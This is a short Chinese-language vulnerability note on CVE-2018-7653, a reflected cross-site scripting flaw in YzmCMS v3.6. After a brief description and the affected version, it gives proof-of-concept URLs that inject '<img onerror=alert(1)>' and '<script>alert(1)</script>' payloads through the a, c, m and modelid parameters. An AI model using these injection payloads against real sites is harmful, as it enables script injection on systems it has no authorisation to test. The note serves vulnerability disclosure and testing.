# （CVE-2018-7653）YzmCMS v3.6 xss漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3304](https://www.zhihuifly.com/t/topic/3304)

# （CVE-2018-7653）YzmCMS v3.6 xss漏洞

## 一、漏洞简介

YzmCMS是中国程序员袁志蒙开发的一套开源的CMS（内容管理系统）。 YzmCMS 3.6版本中存在跨站脚本漏洞。远程攻击者可借助‘a’、‘c’或‘m’参数利用该漏洞注入任意的Web脚本或HTML。

## 二、漏洞影响

YzmCMS v3.6

## 三、复现过程

### poc

```
http://www.0-sec.org/YzmCMS/index.php?m=search&c=index&a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs&modelid=1&q=tes 

[http://www.0-sec.org/YzmCMS/index.php?m=search&c=indexf9q6s<img%20src%3Da%20onerror%3Dalert(1)>j4yck&a=init&modelid=1&q=tes](http://www.0-sec.org/YzmCMS/index.php?m=search&c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck&a=init&modelid=1&q=tes)

[http://www.0-sec.org/YzmCMS/index.php?m=searchr81z4<img%20src%3Da%20onerror%3Dalert(1)>o92wf&c=index&a=init&modelid=1&q=tes](http://www.0-sec.org/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf&c=index&a=init&modelid=1&q=tes) `[http://www.0-sec.org/YzmCMS/index.php?m=search&c=index&a=init&modelid=1b2sgd"><script>alert(1)<%2Fscript>opzx0&q=tes](http://www.0-sec.org/YzmCMS/index.php?m=search&c=index&a=init&modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0&q=tes)` 
```

## 参考链接

> https://www.anquanke.com/vul/id/1124944